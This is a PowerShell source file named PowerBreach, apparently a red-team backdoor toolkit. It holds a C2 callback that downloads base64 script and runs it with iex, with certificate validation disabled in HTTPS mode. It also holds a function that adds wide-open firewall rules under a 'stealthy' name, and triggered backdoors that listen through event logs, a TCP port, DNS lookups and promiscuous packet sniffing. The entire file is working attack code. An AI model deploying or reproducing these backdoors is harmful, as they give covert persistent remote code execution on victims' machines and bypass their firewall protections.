###################################################################################
# Name: PowerBreach
# Author: sixdub  (sixdub.net)
# Tested on: Windows 7
#
#
###################################################################################

function Invoke-CallbackIEX
{
<#
.SYNOPSIS
Used to callback to C2 and execute script
.DESCRIPTION
Used to initiate a callback to a defined node and request a resource. The resource is then decoded and executed as a powershell script. There are many methods for callbacks.
Admin Reqd? No
Firewall Hole Reqd? No
.PARAMETER CallbackIP
The IP Address of the host to callback to
.PARAMETER Method
Defines which method to use to perform the callback.
0 - HTTP *Default
1 - HTTPS
2 - BITS
.PARAMETER BitsTempFile
The path to place a file on disk temporarily when BITS is the chosen method. Default is "%USERTEMP%\ps_conf.cfg".
.PARAMETER Resource
The page to request. Default is "/favicon.ico"
.PARAMETER Silent
Whether you want to produce output or not. Default is "FALSE"
#>
	Param(
	[Parameter(Mandatory=$True,Position=1)]
	[string]$CallbackIP,
	[Parameter(Mandatory=$False,Position=2)]
	[int]$Method=0,
	[Parameter(Mandatory=$False,Position=3)]
	[string]$BitsTempFile="$env:temp\ps_conf.cfg",
	[Parameter(Mandatory=$False,Position=4)]
	[string]$resource="/favicon.ico",
	[Parameter(Mandatory=$False,Position=5)]
	[bool]$Silent=$false
	)
	
	#if you have a place to call home too...
	if($CallbackIP)
	{
		try {
			#HTTP Method
			if ($Method -eq 0)
			{
				#Set the url
				$url="http://$CallbackIP$resource"
				if(-not $Silent) {write-host "Calling home with method $method to: $url"}
				#download string from the URL
				$enc = (new-object net.webclient).downloadstring($url)
			}
			#HTTPS Method
			elseif ($Method -eq 1)
			{
				[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
				$url="https://$CallbackIP$resource"
				if(-not $Silent) {write-host "Calling home with method $method to: $url"}
				#download string from the URL with HTTPS
				$enc = (new-object net.webclient).downloadstring($url)
			}
			#Bits Method
			elseif ($Method -eq 2)
			{
				$url="http://$CallbackIP$resource"
				if(-not $Silent) { write-host "Calling home with method $method to: $url"
				write-host "BITS Temp output to: $BitsTempFile"}
				Import-Module *bits*
				Start-BitsTransfer $url $BitsTempFile -ErrorAction Stop
				
				$enc = Get-Content $BitsTempFile -ErrorAction Stop
				
				#delete the temp file
				Remove-Item $BitsTempFile -ErrorAction SilentlyContinue
				
			}
			else 
			{
				if(-not $Silent) { write-host "Error: Improper callback method" -fore red}
				return 0
			}
			
			#Check to make sure something got downloaded, if so, decode it and 
			if ($enc)
			{
				#decode the string
				$b = [System.Convert]::FromBase64String($enc)
				$dec = [System.Text.Encoding]::UTF8.GetString($b)
				
				#execute script
				iex $dec
			}
			else
			{
				if(-not $Silent) { write-host "Error: No Data Downloaded" -fore red}
				return 0
			}
		}
		catch [System.Net.WebException]{
			if(-not $Silent) { write-host "Error: Network Callback failed" -fore red}
			return 0
		}
		catch [System.FormatException]{
			if(-not $Silent) { write-host "Error: Base64 Format Problem" -fore red}
			return 0
		}
		catch [System.Exception]{
			if(-not $Silent) { write-host "Error: Uknown problem during transfer" -fore red}
			#$_.Exception | gm
			return 0
		}
	}
	else
	{
		if(-not $Silent) { write-host "No host specified for the phone home :(" -fore red}
		return 0
	}
	
	return 1
}

function Add-PSFirewallRules
{
<#
.SYNOPSIS
Used to open a hole in the firewall to allow Powershell to communicate
.DESCRIPTION
Opens 4 rules in the firewall, 2 for each direction. Allows TCP and UDP communications on ports 1-65000. This will hopefully prevent popups from displaying to interactive user. 
Admin Reqd? No
Firewall Hole Reqd? No
.PARAMETER RuleName
The name of the rule to be added to the firewall. This should be stealthy. Default="Windows Powershell"
.PARAMETER ExePath
The program to allow through the filewall. Default="C:\windows\system32\windowspowershell\v1.0\powershell.exe"
.PARAMETER Ports
The ports to allow communications on. Default="1-65000"
#>
	Param(
	[Parameter(Mandatory=$False,Position=1)]
	[string]$RuleName="Windows Powershell",
	[Parameter(Mandatory=$False,Position=2)]
	[string]$ExePath="C:\windows\system32\windowspowershell\v1.0\powershell.exe",
	[Parameter(Mandatory=$False,Position=3)]
	[string]$Ports="1-65000"
	)

	If (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator"))
	{
		Write-Host "This command requires Admin :(... get to work! "
		Return
	}
	
	#Rule 1, TCP, Outbound
	$fw = New-Object -ComObject hnetcfg.fwpolicy2
	$rule = New-Object -ComObject HNetCfg.FWRule
	$rule.Name = $RuleName
	$rule.ApplicationName=$ExePath
	$rule.Protocol = 6
	$rule.LocalPorts = $Ports
	$rule.Direction = 2
	$rule.Enabled=$true
	$rule.Grouping="@firewallapi.dll,-23255"
	$rule.Profiles = 7
	$rule.Action=1
	$rule.EdgeTraversal=$false
	$fw.Rules.Add($rule)
	
	#Rule 2, UDP Outbound
	$rule = New-Object -ComObject HNetCfg.FWRule
	$rule.Name = $RuleName
	$rule.ApplicationName=$ExePath
	$rule.Protocol = 17
	$rule.LocalPorts = $Ports
	$rule.Direction = 2
	$rule.Enabled=$true
	$rule.Grouping="@firewallapi.dll,-23255"
	$rule.Profiles = 7
	$rule.Action=1
	$rule.EdgeTraversal=$false
	$fw.Rules.Add($rule)
	
	#Rule 3, TCP Inbound
	$rule = New-Object -ComObject HNetCfg.FWRule
	$rule.Name = $RuleName
	$rule.ApplicationName=$ExePath
	$rule.Protocol = 6
	$rule.LocalPorts = $Ports
	$rule.Direction = 1
	$rule.Enabled=$true
	$rule.Grouping="@firewallapi.dll,-23255"
	$rule.Profiles = 7
	$rule.Action=1
	$rule.EdgeTraversal=$false
	$fw.Rules.Add($rule)
	
	#Rule 4, UDP Inbound
	$rule = New-Object -ComObject HNetCfg.FWRule
	$rule.Name = $RuleName
	$rule.ApplicationName=$ExePath
	$rule.Protocol = 17
	$rule.LocalPorts = $Ports
	$rule.Direction = 1
	$rule.Enabled=$true
	$rule.Grouping="@firewallapi.dll,-23255"
	$rule.Profiles = 7
	$rule.Action=1
	$rule.EdgeTraversal=$false
	$fw.Rules.Add($rule)

}

function Invoke-EventLoop
{
<#
.SYNOPSIS
Starts the event-loop backdoor
.DESCRIPTION
The backdoor continually parses the Security event logs. For every entry, it checks to see if the message contains a unique trigger value. If it finds the trigger, it calls back to a predefined IP Address. This backdoor is based on the Shmoocon presentation "Wipe the Drive". See here for more info: XXXXXXXXX
Admin Reqd? Yes
Firewall Hole Reqd? No
.PARAMETER CallbackIP
The IP Address of the host to callback to
.PARAMETER Trigger
The unique value to look for in every event packet. In the case of RDP, this will be the username you use to attempt a login. Default="SIXDUB"
.PARAMETER Timeout
A value in seconds to continue running the backdoor. Default=0 (run forever)
.PARAMETER Sleep
The time to sleep in between event log checks. 
#>
	Param(
	[Parameter(Mandatory=$True,Position=1)]
	[string]$CallbackIP,
	[Parameter(Mandatory=$False,Position=2)]	
	[string]$Trigger="SIXDUB", 
	[Parameter(Mandatory=$False,Position=3)]
	[int]$Timeout=0,
	[Parameter(Mandatory=$False,Position=4)]
	[int] $Sleep=1
	)

	If (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator"))
	{
		Write-Host "This backdoor requires Admin :(... get to work! "
		Return
	}
	#Output info
	write-host "Timeout: $Timeout"
	write-host "Trigger: $Trigger"
	write-host "CallbackIP: $CallbackIP"
	write-host
	write-host "Starting backdoor..."
	
	#initiate loop variables
	$running=$true
	$match =""
	$starttime = get-date
	while($running)
	{
		#check timeout value
		if ($Timeout -ne 0 -and ($([DateTime]::Now) -gt $starttime.addseconds($Timeout)))  # if user-specified timeout has expired
		{
			$running=$false
		}
		#grab all events since the last cycle and store their "message" into a variable
		$d = Get-Date
		$NewEvents = Get-WinEvent -FilterHashtable @{logname='Security'; StartTime=$d.AddSeconds(-$Sleep)} -ErrorAction SilentlyContinue | fl Message | Out-String
		
		#check if the events contain our trigger value
		if ($NewEvents -match $Trigger)
		{
				$running=$false
				$match = $CallbackIP
				write-host "Match: $match"
		}
		sleep -s $Sleep
	}
	if($match)
	{
		$success = Invoke-CallbackIEX $match
	}
}

function Invoke-PortBind
{
<#
.SYNOPSIS
Starts the TCP Port Bind backdoor
.DESCRIPTION
The backdoor opens a TCP port on a specified port. For every connection to the port, it looks for a specified trigger value. When found, it initiates a callback and closes the TCP Port. 
Admin Reqd? No
Firewall Hole Reqd? Yes
.PARAMETER CallbackIP
The IP Address of the host to callback to. By default, this backdoor calls back to whoever triggered it. 
.PARAMETER LocalIP
The interface to bind the TCP port to. By default, the script will use the default GW to determine this value. 
.PARAMETER Port
The port to bind. Default=4444
.PARAMETER Trigger
The unique value the backdoor is waiting for. Default="QAZWSX123"
.PARAMETER Timeout
The time to run the backdoor. Default=0 (run forever)
#>
	Param(
	[Parameter(Mandatory=$False,Position=1)]
	[string]$CallbackIP,
	[Parameter(Mandatory=$False,Position=2)]
	[string]$LocalIP, 
	[Parameter(Mandatory=$False,Position=3)]
	[int]$Port=4444, 
	[Parameter(Mandatory=$False,Position=4)]
	[string]$Trigger="QAZWSX123", 
	[Parameter(Mandatory=$False,Position=5)]
	[int]$Timeout=0
	)
	
	# try to figure out which IP address to bind to by looking at the default route
	if (-not $LocalIP) 
	{
		route print 0* | % { 
			if ($_ -match "\s{2,}0\.0\.0\.0") { 
				$null,$null,$null,$LocalIP,$null = [regex]::replace($_.trimstart(" "),"\s{2,}",",").split(",")
				}
			}
	}
	
	#output info
	write-host "!!! THIS BACKDOOR REQUIRES FIREWALL EXCEPTION !!!"
	write-host "Timeout: $Timeout"
	write-host "Port: $Port"
	write-host "Trigger: $Trigger"
	write-host "Using IPv4 Address: $LocalIP"
	write-host "CallbackIP: $CallbackIP"
	write-host
	write-host "Starting backdoor..."
	try{
		
		#Define and initialize all the networing stuff
		$ipendpoint = new-object system.net.ipendpoint([net.ipaddress]"$localIP",$Port)
		$Listener = new-object System.Net.Sockets.TcpListener $ipendpoint
		$Listener.Start()
		
		#set variables for the loop
		$running=$true
		$match =""
		$starttime = get-date
		while($running)
		{			
			#Check for timeout
			if ($Timeout -ne 0 -and ($([DateTime]::Now) -gt $starttime.addseconds($Timeout)))  # if user-specified timeout has expired
			{
				$running=$false
			}
			
			#If there is a connection pending on the socket
			if($Listener.Pending())
			{
				#accept the client and define the input stream
				$Client = $Listener.AcceptTcpClient()
				write-host "Client Connected!"
				$Stream = $Client.GetStream()
				$Reader = new-object System.IO.StreamReader $Stream
				
				#read one line off the socket
				$line = $Reader.ReadLine()
				
				#check to see if proper trigger value
				if ($line -eq $Trigger)
				{
					$running=$false
					$match = ([system.net.ipendpoint] $Client.Client.RemoteEndPoint).Address.ToString()
					write-host "MATCH: $match"
				}
				
				#clean up
				$reader.Dispose()
				$stream.Dispose()
				$Client.Close()
				write-host "Client Disconnected"
			}
		}
		
		#Stop the socket and check for match
		write-host "Stopping Socket"
		$Listener.Stop()
		if($match)
		{
			if($CallbackIP)
			{
				$success = Invoke-CallbackIEX $CallbackIP
			}
			else
			{
				$success = Invoke-CallbackIEX $Match
			}
		}
	}
	catch [System.Net.Sockets.SocketException] {
		write-host "Error: Socket Error" -fore red
	}
}

function Invoke-DNSLoop
{
<#
.SYNOPSIS
Starts the DNS Loop Backdoor 
.DESCRIPTION
This backdoor resolves a predefined hostname at a preset interval. If the resolved address is different than the specified trigger, than it initiates a callback
Admin Reqd? No
Firewall Hole Reqd? No
.PARAMETER CallbackIP
The IP Address of the host to callback to. By default, this backdoor calls back to the newly resolved IP Address.
.PARAMETER Hostname
The hostname to routinely check for a trigger. Default="yay.sixdub.net"
.PARAMETER Trigger
The IP Address that the backdoor is looking for. Default="127.0.0.1"
.PARAMETER Timeout
The time to run the backdoor. Default=0 (run forever)
.PARAMETER Sleep
The seconds to sleep between DNS resolution. Default="1s"
#>
	param(
		[Parameter(Mandatory=$False,Position=1)]
		[string]$CallbackIP,
		[Parameter(Mandatory=$False,Position=2)]
		[string]$Hostname="yay.sixdub.net",
		[Parameter(Mandatory=$False,Position=3)]
		[string]$Trigger="127.0.0.1",
		[Parameter(Mandatory=$False,Position=4)]
		[int] $Timeout=0,
		[Parameter(Mandatory=$False,Position=5)]
		[int] $Sleep=1
	)
	
	#output info
	write-host "Timeout: $Timeout"
	write-host "Sleep Time: $Sleep"
	write-host "Trigger: $Trigger"
	write-host "Using Hostname: $Hostname"
	write-host "CallbackIP: $CallbackIP"
	write-host
	write-host "Starting backdoor..."
	
	#set loop variables
	$running=$true
	$match =""
	$starttime = get-date
	while($running)
	{
		#check timeout
		if ($Timeout -ne 0 -and ($([DateTime]::Now) -gt $starttime.addseconds($Timeout)))  # if user-specified timeout has expired
		{
			$running=$false
		}
		
		try {
			#try to resolve hostname
			$ips = [System.Net.Dns]::GetHostAddresses($Hostname)
			foreach ($addr in $ips)
			{
				#take all of the IPs returned and check to see if they have changed from our "trigger
				#If they do not match the trigger, use it for C2 address
				$resolved=$addr.IPAddressToString
				if($resolved -ne $Trigger)
				{
					$running=$false
					$match=$resolved
					write-host "Match: $match"
				}
				
			}
		}
		catch [System.Net.Sockets.SocketException]{
			
		}

		sleep -s $Sleep
	}
	write-host "Shutting down DNS Check..."
	if($match)
	{
		if($CallbackIP)
		{
			$success = Invoke-CallbackIEX $CallbackIP
		}
		else
		{
			$success = Invoke-CallbackIEX $Match
		}
	}
}

function Invoke-PacketKnock
{	
<#
.SYNOPSIS
Starts the Packet Knock backdoor
.DESCRIPTION
The backdoor sniffs packets destined for a certain interface. In each packet, a trigger value is looked for. The the trigger value is found, the backdoor initiates a callback. This backdoor utilizes a promiscuous socket and should not open up a port on the system. 
Admin Reqd? Yes
Firewall Hole Reqd? Yes
.PARAMETER CallbackIP
The IP Address of the host to callback to. By default, this backdoor calls back to whoever triggered it. 
.PARAMETER LocalIP
The interface to bind the TCP port to. By default, the script will use the default GW to determine this value. 
.PARAMETER Trigger
The unique value the backdoor is waiting for. Default="QAZWSX123"
.PARAMETER Timeout
The time to run the backdoor. Default=0 (run forever)
#>
	param(
	[Parameter(Mandatory=$False,Position=1)]
	[string]$CallbackIP,
	[Parameter(Mandatory=$False,Position=2)]
	[string]$LocalIP, 
	[Parameter(Mandatory=$False,Position=3)]
	[string]$Trigger="QAZWSX123", 
	[Parameter(Mandatory=$False,Position=4)]
	[int]$Timeout=0
	)
	If (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator"))
	{
		Write-Host "This backdoor requires Admin :(... get to work! "
		Return
	}
	# try to figure out which IP address to bind to by looking at the default route
	if (-not $LocalIP) 
	{
		route print 0* | % { 
			if ($_ -match "\s{2,}0\.0\.0\.0") { 
				$null,$null,$null,$LocalIP,$null = [regex]::replace($_.trimstart(" "),"\s{2,}",",").split(",")
				}
			}
	}
	
	#output info
	write-host "!!! THIS BACKDOOR REQUIRES FIREWALL EXCEPTION !!!"
	write-host "Timeout: $Timeout"
	write-host "Trigger: $Trigger"
	write-host "Using IPv4 Address: $LocalIP"
	write-host "CallbackIP: $CallbackIP"
	write-host
	write-host "Starting backdoor..."
	
	#define bytes for socket setup
	$byteIn = new-object byte[] 4
	$byteOut = new-object byte[] 4
	$byteData = new-object byte[] 4096  # size of data

	$byteIn[0] = 1  # this enables promiscuous mode (ReceiveAll)
	$byteIn[1-3] = 0
	$byteOut[0-3] = 0
	
	#Open a raw socket and set to promiscuous mode. Include the IP Header
	$socket = new-object system.net.sockets.socket([Net.Sockets.AddressFamily]::InterNetwork,[Net.Sockets.SocketType]::Raw,[Net.Sockets.ProtocolType]::IP)
	$socket.setsocketoption("IP","HeaderIncluded",$true)
	$socket.ReceiveBufferSize = 819200

	#set the local socket info and bind it
	$ipendpoint = new-object system.net.ipendpoint([net.ipaddress]"$localIP",0)
	$socket.bind($ipendpoint)

	#turn on promiscuous
	[void]$socket.iocontrol([net.sockets.iocontrolcode]::ReceiveAll,$byteIn,$byteOut)

	#set loop data
	$starttime = get-date
	$running = $true
	$match = ""
	$packets = @()
	while ($running)
	{
		#check timeout
		if ($Timeout -ne 0 -and ($([DateTime]::Now) -gt $starttime.addseconds($Timeout)))  # if user-specified timeout has expired
		{
			$running=$false
		}
		#check for queued up packets
		if (-not $socket.Available)
		{
			start-sleep -milliseconds 500
			continue
		}
		
		#Take any date off the socket
		$rcv = $socket.receive($byteData,0,$byteData.length,[net.sockets.socketflags]::None)

		# Created streams and readers
		$MemoryStream = new-object System.IO.MemoryStream($byteData,0,$rcv)
		$BinaryReader = new-object System.IO.BinaryReader($MemoryStream)
		
		# Trash all the header bytes we dont care about. RFC 791
		$trash  = $BinaryReader.ReadBytes(12)
		
		#Read the SRC and DST IP
		$SourceIPAddress = $BinaryReader.ReadUInt32()
		$SourceIPAddress = [System.Net.IPAddress]$SourceIPAddress
		$DestinationIPAddress = $BinaryReader.ReadUInt32()
		$DestinationIPAddress = [System.Net.IPAddress]$DestinationIPAddress
		$RemainderBytes = $BinaryReader.ReadBytes($MemoryStream.Length)
		
		#Convert the remainder of the packet into ASCII
		$AsciiEncoding = new-object system.text.asciiencoding
		$RemainderOfPacket = $AsciiEncoding.GetString($RemainderBytes)
		
		#clean up clean up
		$BinaryReader.Close()
		$memorystream.Close()
		
		#check rest of packet for trigger value
		if ($RemainderOfPacket -match $Trigger)
		{
			write-host "Match: " $SourceIPAddress
			$running=$false
			$match = $SourceIPAddress
		}
	}
	
	if($match)
	{
		if($CallbackIP)
		{
			$success = Invoke-CallbackIEX $CallbackIP
		}
		else
		{
			$success = Invoke-CallbackIEX $Match
		}
	}
	
}

function Invoke-CallbackLoop
{
<#
.SYNOPSIS
Starts the Callback loop backdoor
.DESCRIPTION
The backdoor initiates a callback on a routine interval. If successful in executing a script, the backdoor will exit. 
Admin Reqd? No
Firewall Hole Reqd? No
.PARAMETER CallbackIP
The IP Address of the host to callback to.  
.PARAMETER Timeout
The time to run the backdoor. Default=0 (run forever)
.PARAMETER Sleep
The seconds to sleep between callback. Default=1. 
#>
	Param(  
	[Parameter(Mandatory=$True,Position=1)]
	[string]$CallbackIP,
	[Parameter(Mandatory=$False,Position=2)]
	[int]$Timeout=0,
	[Parameter(Mandatory=$False,Position=3)]
	[int] $Sleep=1
	)
	
		#Output info
	write-host "Timeout: $Timeout"
	write-host "Sleep: $Sleep"
	write-host "CallbackIP: $CallbackIP"
	write-host
	write-host "Starting backdoor..."
	
	#initiate loop variables
	$running=$true
	$match =""
	$starttime = get-date
	while($running)
	{
		#check timeout value
		if ($Timeout -ne 0 -and ($([DateTime]::Now) -gt $starttime.addseconds($Timeout)))  # if user-specified timeout has expired
		{
			$running=$false
		}
		
		$CheckSuccess = Invoke-CallbackIEX $CallbackIP -Silent $true
		
		if($CheckSuccess -eq 1)
		{
			$running=$false
		}
		
		sleep -s $Sleep
	}
	
	write-host "Shutting down backdoor..."
}